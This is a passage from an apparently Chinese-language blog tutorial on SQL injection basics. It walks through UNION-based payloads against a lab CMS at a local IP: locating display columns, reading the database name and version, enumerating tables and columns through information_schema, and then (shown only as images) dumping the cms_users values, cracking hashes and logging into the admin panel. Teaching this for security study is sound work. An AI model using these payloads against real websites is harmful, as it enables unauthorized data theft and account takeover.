null, null, null, null, null, null, null, null, null, null, null, null, null,null–+]<br>      页面显示的是第一张虚拟表的内容，那么我们可以考虑让第一张虚拟表的查询条件为假，则显示第二条记录。因此构造SQL语句:<br>      [?id=33 and 1=2 union select 1,2,3,4,5,6,7,8,9, 10,11, 12,13,14,15 –+]<br>      [?id=-33 union select 1,2,3,4,5,6, 7,8,9,10, 11,12,13,14,15 –+]</p><ul><li>案例</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165657390.png" alt="判断数据显示位置" style="zoom:80%;"><h2 id="4-6-数据库名和数据库版本信息获取"><a href="#4-6-数据库名和数据库版本信息获取" class="headerlink" title="4.6 数据库名和数据库版本信息获取"></a>4.6 数据库名和数据库版本信息获取</h2><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165724657-2265846.png" alt="数据库名和数据库版本信息获取" style="zoom:80%;"><p>version()函数获取版本信息。</p><h2 id="4-7-获取目标数据库数据表名"><a href="#4-7-获取目标数据库数据表名" class="headerlink" title="4.7 获取目标数据库数据表名"></a>4.7 获取目标数据库数据表名</h2><h3 id="4-7-1-暴力破解的思路"><a href="#4-7-1-暴力破解的思路" class="headerlink" title="4.7.1 暴力破解的思路"></a>4.7.1 暴力破解的思路</h3><ul><li>案例</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165838388.png" alt="暴力破解的思路" style="zoom:80%;"><h3 id="4-7-2-利用information-schema数据库获取"><a href="#4-7-2-利用information-schema数据库获取" class="headerlink" title="4.7.2 利用information_schema数据库获取"></a>4.7.2 利用information_schema数据库获取</h3><ul><li>获取思路</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122165934014.png" alt="image-20241122165934014" style="zoom:90%;"><ul><li>获取关于目标数据库的所有表名</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122170057236.png" alt="获取关于目标数据库的所有表名" style="zoom:80%;"><h2 id="4-8-获取目标数据表字段名"><a href="#4-8-获取目标数据表字段名" class="headerlink" title="4.8 获取目标数据表字段名"></a>4.8 获取目标数据表字段名</h2><pre class="line-numbers language-latex" data-language="latex"><code class="language-latex">http://192.168.33.4/cms/show.php ?id=-35 union select 1,2,3,4,5,6,7,8,9,10,hex(group_concat(column_name)),12,13,14,15 from information_schema.columns where table_schema=database() and table_name=cms_users--+ 为了避免单引号的使用，将cms_users转化成十六进制形式。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>案例</li></ul><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122170337710.png" alt="获取目标数据表字段名" style="zoom:80%;"><h2 id="4-8-获取字段的值"><a href="#4-8-获取字段的值" class="headerlink" title="4.8 获取字段的值"></a>4.8 获取字段的值</h2><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122170421214.png" alt="获取字段的值" style="zoom:80%;"><h2 id="4-9-解密hash值"><a href="#4-9-解密hash值" class="headerlink" title="4.9 解密hash值"></a>4.9 解密hash值</h2><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122170556162.png" alt="解密hash值" style="zoom:80%;"><h2 id="4-10-登录后台"><a href="#4-10-登录后台" class="headerlink" title="4.10 登录后台"></a>4.10 登录后台</h2><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122170615237-2266376.png" alt="登录后台" style="zoom:80%;">]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> sql注入基础 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
